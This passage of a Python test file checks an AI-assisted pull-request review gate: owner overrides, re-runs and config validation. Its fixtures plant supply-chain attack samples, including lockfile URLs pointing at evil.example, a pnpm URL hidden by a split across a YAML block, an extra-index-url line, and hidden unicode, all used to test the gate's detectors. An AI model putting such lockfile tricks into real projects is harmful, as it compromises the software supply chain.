    tl = [posted(1), dismissal(1, OWNER), REWRITE, posted(5), dismissal(5, OWNER)]
    out, model = run(FakeGitHub(reviews=reviews, timeline=tl), attempt=2)
    assert out.exit_code == 0 and model.calls == []


def test_update_branch_after_an_override_carries_the_override_pass_over():
    # The merge commit is a new head with no block of its own: carry-over
    # decides, not the dismissal.
    h = own_hash_of(DIFF)
    reviews = [gate_review("block", HEAD, h, rid=1, state="DISMISSED"),
               gate_review("pass", HEAD, h, rid=3)]
    gh = FakeGitHub(diff=shifted(DIFF), head=NEWER, reviews=reviews,
                    timeline=[posted(1), dismissal(1, OWNER), posted(3)])
    out, model = run(gh, action="synchronize", head=NEWER)
    assert out.exit_code == 0 and model.calls == [] and "carried over" in gh.posted[0][2]


def raw_timeline(*items):
    """A REST timeline page, read through the real client's parser."""
    client = GitHub("t", REPO, api_url="https://api.github.test",
                    graphql_url="https://api.github.test/graphql",
                    urlopen=lambda req, timeout=None: io.BytesIO(json.dumps(list(items)).encode()))
    return client.timeline(7)


def test_a_future_dated_head_commit_does_not_void_the_owners_dismissal():
    # GitHub places `committed` at the commit's own date: a head commit
    # dated in the future (or clock skew) sorts after the dismissal.
    tl = raw_timeline(
        {"event": "reviewed", "id": 1},
        {"event": "review_dismissed", "actor": {"login": OWNER},
         "dismissed_review": {"review_id": 1}},
        {"event": "committed", "sha": HEAD, "committer": {"date": "2099-01-01T00:00:00Z"}})
    for out, model, _ in override_attempts(lambda: blocked(timeline=tl)):
        assert out.exit_code == 0 and model.calls == []
        assert out.message == "passed (owner-override)"


def test_a_dismissal_is_void_after_a_force_push_away_and_a_push_back():
    # Block H, owner dismisses, force-push to H's parent, fast-forward back
    # to H (its `committed` event sorts at H's own, earlier, date).
    tl = raw_timeline(
        {"event": "committed", "sha": HEAD},
        {"event": "reviewed", "id": 1},
        {"event": "review_dismissed", "actor": {"login": OWNER},
         "dismissed_review": {"review_id": 1}},
        {"event": "head_ref_force_pushed"})
    for out, model, gh in override_attempts(lambda: blocked(timeline=tl)):
        assert out.exit_code == 1 and model.calls == [] and gh.posted == []


class NoTimeline(FakeGitHub):
    status = 403

    def timeline(self, number):
        raise GitHubError("timeline", self.status)


def no_timeline(status):
    gh = NoTimeline(reviews=[gate_review("block", HEAD, own_hash_of(DIFF), rid=1,
                                         state="DISMISSED")])
    gh.status = status
    return gh


@pytest.mark.parametrize("status", [403, 404])
def test_an_unreadable_timeline_is_a_config_error_not_a_retry(status):
    # Without `issues: read` the timeline answers 403/404 on every run, and
    # the fix (a workflow change) is itself a sensitive-path block whose
    # override needs the timeline: "toggle to retry" would loop forever.
    gh = no_timeline(status)
    out, model = run(gh, attempt=2)
    assert out.exit_code == 1 and gh.posted == [] and model.calls == []
    assert out.message.startswith("config:") and "issues: read" in out.message
    assert core.RETRY not in out.message and "will not help" in out.message


def test_a_timeline_server_error_stays_infra():
    gh = no_timeline(502)
    out, _ = run(gh, attempt=2)
    assert out.message.startswith("infra:") and core.RETRY in out.message


def test_a_dismissal_whose_block_is_not_on_the_timeline_does_not_count():
    out, model = run(blocked(timeline=[dismissal(1, OWNER)]), attempt=2)
    assert out.exit_code == 1 and model.calls == []


def test_a_block_posted_as_a_comment_still_blocks_the_head():
    gh = FakeGitHub(reviews=[gate_review("block", HEAD, "0" * 64, rid=1, state="COMMENTED")])
    out, model = run(gh)
    assert out.exit_code == 1 and model.calls == []
    assert "must dismiss" not in out.message
    assert "cannot be dismissed" in out.message and "ruleset bypass" in out.message


def test_a_dismissable_block_beside_a_comment_block_says_dismiss_it():
    gh = FakeGitHub(reviews=[gate_review("block", HEAD, "0" * 64, rid=1, state="COMMENTED"),
                             gate_review("block", HEAD, "0" * 64, rid=2)])
    out, _ = run(gh)
    assert "jonathan must dismiss its review" in out.message


def test_a_dismissed_block_of_an_older_head_does_not_override_this_one():
    h = own_hash_of(DIFF)
    gh = FakeGitHub(reviews=[gate_review("block", OLD, h, rid=1, state="DISMISSED")],
                    dismissals=[dismissal(1, OWNER)])
    out, model = run(gh, attempt=2)
    assert out.exit_code == 1 and "re-run never asks the model" in out.message
    assert model.calls == [] and gh.posted == []


def test_a_block_of_the_same_changes_at_an_older_head_does_not_guard_an_owner_toggle():
    # Deliberate: amend/rebase + an owner auto-merge click is a fresh review.
    gh = FakeGitHub(reviews=[gate_review("block", OLD, own_hash_of(DIFF), rid=6)])
    out, model = run(gh)
    assert len(model.calls) == 1 and out.exit_code == 0


def test_the_timeline_is_read_only_when_this_head_has_a_gate_block():
    gh = FakeGitHub()
    run(gh)
    assert gh.timeline_reads == 0


def test_override_clears_path_and_binary_rules():
    diff = DIFF.replace("src/app.py", ".github/workflows/ci.yml") + (
        "diff --git a/logo.png b/logo.png\nnew file mode 100644\n"
        "Binary files /dev/null and b/logo.png differ\n")
    gh = blocked(diff=diff, files={"logo.png": b"\x89PNG\r\n\x1a\n"},
                 dismissals=[dismissal(1, OWNER)])
    out, model = run(gh, attempt=2)
    assert out.exit_code == 0 and model.calls == []


def test_override_never_clears_hidden_unicode():
    diff = DIFF.replace("+    c = 4", '+    c = "\ufe01\ufe02"')
    gh = blocked(diff=diff, dismissals=[dismissal(1, OWNER)])
    out, model = run(gh, attempt=2)
    assert out.exit_code == 1 and model.calls == []
    assert gh.posted[0][0] == "REQUEST_CHANGES" and "hidden-unicode" in gh.posted[0][2]


LOCK_DIFF = ("diff --git a/uv.lock b/uv.lock\n--- a/uv.lock\n+++ b/uv.lock\n@@ -1 +1 @@\n"
             '-x\n+url = "https://evil.example/p.whl"\n')
EVIL_LOCK = {"uv.lock": b'url = "https://evil.example/p.whl"\n'}


def test_override_never_clears_lockfile_hosts():
    gh = blocked(diff=LOCK_DIFF, files=EVIL_LOCK, dismissals=[dismissal(1, OWNER)])
    out, _ = run(gh, attempt=2)
    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]


# A URL split by a blank line inside a YAML block scalar. The diff shows only
# one innocuous-looking added line; the whole file is what pnpm reads.
PNPM_DIFF = ("diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\n--- a/pnpm-lock.yaml\n"
             "+++ b/pnpm-lock.yaml\n@@ -5,1 +5,1 @@\n-        x\n+        .evil.example/p.tgz\n")
PNPM_SPLIT = {"pnpm-lock.yaml": (b"packages:\n  a@1.0.0:\n    resolution:\n      tarball: |-\n"
                                 b"        https://registry.npmjs.org\n\n        .evil.example/p.tgz\n")}


def test_a_full_review_parses_the_whole_lockfile_at_the_head():
    gh = FakeGitHub(diff=PNPM_DIFF, files=PNPM_SPLIT)
    out, _ = run(gh)
    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]


def test_a_bad_lockfile_value_already_in_the_live_base_does_not_block():
    gh = FakeGitHub(diff=LOCK_DIFF, files=EVIL_LOCK, base_files=EVIL_LOCK)
    out, _ = run(gh)
    assert out.exit_code == 0, out.message


def test_a_renamed_lockfile_is_compared_with_its_old_path_in_the_base():
    diff = LOCK_DIFF.replace("a/uv.lock b/uv.lock", "a/old/uv.lock b/uv.lock").replace(
        "--- a/uv.lock", "--- a/old/uv.lock")
    gh = FakeGitHub(diff=diff, files=EVIL_LOCK, base_files={"old/uv.lock": EVIL_LOCK["uv.lock"]})
    out, _ = run(gh)
    assert out.exit_code == 0, out.message


def pure_rename(old, new):
    return (f"diff --git a/{old} b/{new}\nsimilarity index 100%\n"
            f"rename from {old}\nrename to {new}\n")


EVIL_NPM = b'{"packages": {"node_modules/a": {"resolved": "https://evil.example/a.tgz"}}}\n'


def test_a_file_renamed_into_a_lockfile_name_is_checked_whole():
    # PR 1 adds tests/fixtures/lock.json (no lockfile check: not a lockfile
    # name); PR 2 renames it, unchanged, to package-lock.json. The base at
    # the old path is no lockfile, so none of its values may count as known.
    gh = FakeGitHub(diff=pure_rename("tests/fixtures/lock.json", "package-lock.json"),
                    files={"package-lock.json": EVIL_NPM},
                    base_files={"tests/fixtures/lock.json": EVIL_NPM})
    out, _ = run(gh)
    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]


def test_a_file_renamed_into_a_line_checked_lockfile_name_is_checked_whole():
    # A pure rename shows no lines: the line check must read the whole file.
    evil = b"--extra-index-url https://evil.example/simple\n"
    gh = FakeGitHub(diff=pure_rename("docs/deps.txt", "requirements.txt"),
                    files={"requirements.txt": evil}, base_files={"docs/deps.txt": evil})
    out, _ = run(gh)
    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]


def test_a_lockfile_moved_to_another_directory_keeps_its_base():
    gh = FakeGitHub(diff=pure_rename("a/package-lock.json", "b/package-lock.json"),
                    files={"b/package-lock.json": EVIL_NPM},
                    base_files={"a/package-lock.json": EVIL_NPM})
    out, _ = run(gh)
    assert out.exit_code == 0, out.message


def test_a_base_lockfile_fetch_error_other_than_404_is_infra():
    gh = FakeGitHub(diff=LOCK_DIFF, files=EVIL_LOCK,
                    base_files={"uv.lock": GitHubError("file-content", 502)})
    out, model = run(gh)
    assert out.exit_code == 1 and out.message.startswith("infra:")
    assert gh.posted == [] and model.calls == []


def test_a_lockfile_over_the_fetch_cap_is_a_non_overridable_hit(monkeypatch):
    monkeypatch.setattr(core, "FILE_FETCH_CAP", 10)
    gh = blocked(diff=LOCK_DIFF, files=EVIL_LOCK, dismissals=[dismissal(1, OWNER)])
    out, _ = run(gh, attempt=2)
    assert out.exit_code == 1 and "too large to check" in gh.posted[0][2]


def test_carry_over_parses_the_lockfile_too():
    passed = gate_review("pass", OLD, own_hash_of(PNPM_DIFF), rid=5)
    gh = FakeGitHub(diff=PNPM_DIFF, files=PNPM_SPLIT, reviews=[passed])
    out, _ = run(gh, action="synchronize")
    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]


def test_override_never_clears_a_text_file_with_binary_content():
    diff = DIFF + ("diff --git a/src/x.js b/src/x.js\nnew file mode 100644\n"
                   "Binary files /dev/null and b/src/x.js differ\n")
    gh = blocked(diff=diff, files={"src/x.js": b"run();\n// \x00 hidden\n"},
                 dismissals=[dismissal(1, OWNER)])
    out, model = run(gh, attempt=2)
    assert out.exit_code == 1 and model.calls == []
    assert "text-binary" in gh.posted[0][2]


# ----- step 5: a re-run never asks the model again --------------------------------

def test_a_rerun_without_an_override_fails_without_a_model_call():
    gh = FakeGitHub()
    out, model = run(gh, attempt=2)
    assert out.exit_code == 1 and "re-run never asks the model" in out.message
    assert model.calls == [] and gh.posted == []


def test_attempt_one_of_an_auto_merge_click_is_a_full_review():
    gh = FakeGitHub()
    out, model = run(gh, attempt=1)
    assert out.exit_code == 0 and len(model.calls) == 1


def test_a_rerun_of_a_carry_over_still_carries_over():
    passed = gate_review("pass", OLD, own_hash_of(DIFF), rid=5)
    gh = FakeGitHub(diff=shifted(DIFF), reviews=[passed])
    out, model = run(gh, action="synchronize", attempt=3)
    assert out.exit_code == 0 and model.calls == []

# ----- config validation -------------------------------------------------------------

@pytest.mark.parametrize("kw", [
    {"owner": ""}, {"owner": "bad login!"}, {"effort": "ultra"},
    {"threshold": -1}, {"threshold": 101}, {"model": " "},
])
def test_bad_config_is_rejected(kw):
    with pytest.raises(ValueError):
        cfg(**kw).validate()
